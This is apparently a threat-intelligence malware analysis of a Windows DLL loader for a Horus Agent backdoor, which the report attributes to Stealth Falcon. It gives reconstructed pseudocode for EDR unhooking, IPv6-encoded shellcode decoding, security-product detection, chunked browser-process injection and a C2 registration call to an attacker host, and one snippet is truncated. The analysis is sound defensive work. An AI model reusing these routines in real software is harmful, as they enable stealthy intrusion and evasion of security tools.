01 · Overview

Executive Summary

The sample is a virtualized Windows DLL that prepares and launches a Horus Agent payload. Its core behavior combines environment checks, user-mode hook removal, IPv6-encoded payload reconstruction, browser-process injection, and encrypted Mythic-compatible command and control.

SHA-256 8065c85e387654cb79a12405ff0f99fd4ddd5a5d3b9876986b82822bd10c716f

The DLL executes through exported entry points invoked by rundll32.exe. Before staging the agent, it checks for sandboxes, hypervisors, and security products; restores clean system-library code in memory; decodes shellcode stored as IPv6 text; and writes the payload into msedge.exe or chrome.exe in 1,024-byte chunks.

The sample is attributed to Stealth Falcon, also tracked as FruityArmor, and connected to a campaign exploiting CVE-2025-33053 against government and defense targets in Turkey, Qatar, Egypt, and Yemen.

Operational significance: The loader is designed to make static inspection difficult and to reduce visibility from user-mode security hooks before the backdoor begins C2 activity.
02 · Findings

Key Findings

FINDING 01

Virtualized loader

Code Virtualizer and control-flow flattening obscure control flow, strings, API resolution, and critical loader routines.

FINDING 02

EDR hook removal

The loader maps clean copies of system DLLs and restores executable code in memory before later stages run.

FINDING 03

IPv6 payload encoding

Executable bytes are represented as valid IPv6 strings and reconstructed with RtlIpv6StringToAddressA.

FINDING 04

Chunked process injection

Shellcode is written into browser processes in 0x400-byte blocks, then started with NtCreateThreadEx.

FINDING 05

Mythic-compatible C2

The agent performs encrypted check-in, polls for tasks, and supports survey, file transfer, and shellcode-injection commands.

FINDING 06

Certificate masquerade

Version resources imitate an NVIDIA graphics component, while the Authenticode material is invalid or revoked.

04 · Activity flow

Execution Chain

A WebDAV lure is followed by DLL execution, environment validation, payload recovery, browser-process injection, and encrypted agent check-in.

01

WebDAV lure

An Internet Shortcut launches iediagcmd.exe with its working directory set to a remote WebDAV path associated with summerartcamp[.]net.

02

DLL staging and execution

The chain places DLLs such as attachment.dll or init.dll and invokes an ordinal or CPlApplet export with rundll32.exe.

03

Environment validation

Running processes are compared with more than 100 hashed names associated with 17 security vendors; execution stops when a match is found.

04

System-library restoration

Clean copies of ntdll.dll and kernel32.dll are mapped from disk to replace hooked in-memory code.

05

Payload reconstruction

IPv6-formatted strings are decoded into contiguous shellcode by RtlIpv6StringToAddressA.

06

Injection and agent start

The reconstructed payload is written into Chrome or Edge in 1,024-byte chunks and started with a native remote-thread API.

07

Mythic check-in

The agent builds a registration message, encrypts it, adds an HMAC, and sends it over HTTPS before polling for tasking.

05 · Command and control

C2 Operations

The implant uses an HTTPS transport compatible with the Mythic framework. Registration and tasking data use AES-CBC encryption with HMAC-SHA256 integrity protection.

Registration routine

sub_180004120 resolves an encrypted endpoint, opens a WinINet HTTPS session, prepares a Mythic-style check-in envelope, encrypts it, and submits it to the configured path.

  • RVA: 0x00004120
  • File offset: 0x00003520
  • Transport: HTTPS over TCP 443
  • Crypto: AES-128/256-CBC and HMAC-SHA256

Task dispatcher

sub_180005280 validates and decrypts inbound envelopes, parses JSON task data, and routes commands through an internal switch table.

  • 0x101 survey/host fingerprinting
  • 0x102 directory and file listing
  • 0x103 download/staging
  • 0x104 upload
  • 0x201 chunked shellcode injection
C-like pseudocode · C2 registration
__int64 sub_180004120(SessionContext *ctx)
{
    unsigned char aesKey[32], hmacKey[32];

    resolve_config(ctx->EncryptedDomainBlob, ctx->ResolvedC2Host);
    extract_session_keys(aesKey, hmacKey);

    HINTERNET session = InternetOpenW(ctx->UserAgent,
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    HINTERNET connect = InternetConnectW(session, ctx->ResolvedC2Host,
        INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    HINTERNET request = HttpOpenRequestW(connect, L"POST", ctx->BeaconEndpoint,
        NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);

    build_registration(ctx, &ctx->RegistrationPayload);
    encrypt_and_sign(&ctx->RegistrationPayload, aesKey, hmacKey);

    return HttpSendRequestW(request, ctx->HttpHeaders, -1,

}

06 · Reverse engineering

Technical Deep Dive

6.1 Clean system-DLL remapping

The loader opens C:\Windows\System32\ntdll.dll, creates an image mapping, and replaces executable code in the loaded module to remove user-mode EDR hooks.

C-like pseudocode · NTDLL restoration
PVOID sub_180001850(void)
{
    HANDLE file = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    HANDLE section = CreateFileMappingW(file, NULL,
        PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    PVOID clean = MapViewOfFile(section, FILE_MAP_READ, 0, 0, 0);
    PVOID loaded = GetModuleHandleW(L"ntdll.dll");

    // Locate executable section, make it writable, copy clean bytes,
    // then restore its original memory protection.
    restore_text_section(loaded, clean);

    UnmapViewOfFile(clean);
    CloseHandle(section);
    CloseHandle(file);
    return loaded;
}

sub_180001850 · RVA 0x00001850 · file offset 0x00000C50.

6.2 IPv6 payload reconstruction

Each valid IPv6 string produces 16 bytes. Repeating the conversion and concatenating the results reconstructs the payload without storing a conventional executable blob in the file.

C-like pseudocode · IPfuscation decoder
BOOL sub_1800021A0(const char **table, DWORD count,
                       PBYTE output, SIZE_T *outputSize)
{
    DWORD offset = 0;
    for (DWORD i = 0; i < count; ++i) {
        IN6_ADDR address;
        LPCSTR terminator = NULL;

        if (RtlIpv6StringToAddressA(table[i], &terminator, &address) != 0)
            return FALSE;

        memcpy(output + offset, address.u.Byte, 16);
        offset += 16;
    }
    *outputSize = offset;
    return TRUE;
}

sub_1800021A0 · RVA 0x000021A0 · file offset 0x000015A0.

6.3 Security-process blacklist

A Toolhelp process snapshot is compared with a global table of more than 100 precomputed name hashes covering 17 security vendors. A match causes the loader to stop before network or file-modification activity.

C-like pseudocode · process checks
BOOL sub_180003020(void)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W process = { .dwSize = sizeof(PROCESSENTRY32W) };

    if (Process32FirstW(snapshot, &process)) {
        do {
            DWORD hash = hash_process_name(process.szExeFile);
            if (hash_in_security_table(hash)) {
                CloseHandle(snapshot);
                return TRUE;
            }
        } while (Process32NextW(snapshot, &process));
    }
    CloseHandle(snapshot);
    return FALSE;
}

sub_180003020 · RVA 0x00003020 · file offset 0x00002420.

6.4 Chunked browser-process injection

The routine allocates executable memory in the target, transfers the payload in 0x400-byte writes, and starts a remote thread. Chrome and Microsoft Edge are the target processes.

C-like pseudocode · chunked injection
BOOL sub_1800080B0(HANDLE target, PBYTE payload, SIZE_T size)
{
    PVOID remote = VirtualAllocEx(target, NULL, size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) return FALSE;

    const SIZE_T chunk = 0x400;
    for (SIZE_T offset = 0; offset < size; offset += chunk) {
        SIZE_T length = min(chunk, size - offset);
        if (!WriteProcessMemory(target, (PBYTE)remote + offset,
                payload + offset, length, NULL))
            return FALSE;
    }

    HANDLE thread = NULL;
    NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL,
        target, remote, NULL, 0, 0, 0, 0, NULL);
    return thread != NULL;
}
